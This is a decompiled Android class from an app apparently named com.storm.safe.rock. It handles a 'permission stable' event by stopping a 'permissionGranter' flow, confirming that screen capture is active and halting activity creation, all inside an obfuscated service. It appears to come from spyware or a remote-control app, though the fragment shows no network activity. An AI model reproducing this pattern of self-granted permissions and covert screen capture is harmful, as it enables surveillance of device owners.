package com.storm.safe.rock.service;

import android.content.Intent;
import com.storm.safe.rock.manager.C0260a2;
import com.storm.safe.rock.manager.C0263a5;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.kg1;
import p000.l10;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.dqtvuisjd$handleAndroid15PermissionStable$1", m214403f = "dqtvuisjd.kt", m214404l = {}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class dqtvuisjd$handleAndroid15PermissionStable$1 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public final /* synthetic */ dqtvuisjd f52550a1;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public dqtvuisjd$handleAndroid15PermissionStable$1(dqtvuisjd dqtvuisjdVar, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f52550a1 = dqtvuisjdVar;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new dqtvuisjd$handleAndroid15PermissionStable$1(this.f52550a1, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) throws Throwable {
        dqtvuisjd$handleAndroid15PermissionStable$1 dqtvuisjd_handleandroid15permissionstable_1 = (dqtvuisjd$handleAndroid15PermissionStable$1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2);
        C1351vv c1351vv = C1351vv.f60710b1;
        dqtvuisjd_handleandroid15permissionstable_1.invokeSuspend(c1351vv);
        return c1351vv;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final Object invokeSuspend(Object obj) throws Throwable {
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        kg1.m213544f4(obj);
        try {
            t60.m214714d6("dqtvuisjd", "🛡️ 处理Android 15权限稳定事件（保守策略）");
            t60.m214714d6("dqtvuisjd", "✅ 信任权限稳定广播，直接执行稳定流程");
            C0260a2 c0260a2 = this.f52550a1.f52369a0;
            if (c0260a2 != null) {
                c0260a2.m211325g8(false);
                C0260a2 c0260a22 = this.f52550a1.f52369a0;
                if (c0260a22 == null) {
                    t60.m214724f2("permissionGranter");
                    throw null;
                }
                c0260a22.m211323g1();
                t60.m214714d6("dqtvuisjd", "🛑 确认停止权限申请流程");
            }
            t60.m214714d6("dqtvuisjd", "🛡️ 使用标准权限管理");
            C0263a5 c0263a5 = this.f52550a1.f52370a1;
            if (c0263a5 != null) {
                if (c0263a5.f52153a2) {
                    t60.m214714d6("dqtvuisjd", "✅ 屏幕捕获已恢复（Android 15权限稳定）");
                } else {
                    t60.m214714d6("dqtvuisjd", "✅ 屏幕捕获状态正常");
                }
            }
            this.f52550a1.sendBroadcast(new Intent("com.storm.safe.rock.intent.STOP_ACTIVITY_CREATION"));
            t60.m214714d6("dqtvuisjd", "📡 发送停止Activity创建广播");
            this.f52550a1.f52402d3 = true;
            t60.m214714d6("dqtvuisjd", "🎉 Android 15权限稳定流程完成，系统进入稳定运行状态");
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ 处理Android 15权限稳定失败", e);
        }
        return C1351vv.f60710b1;
    }
}
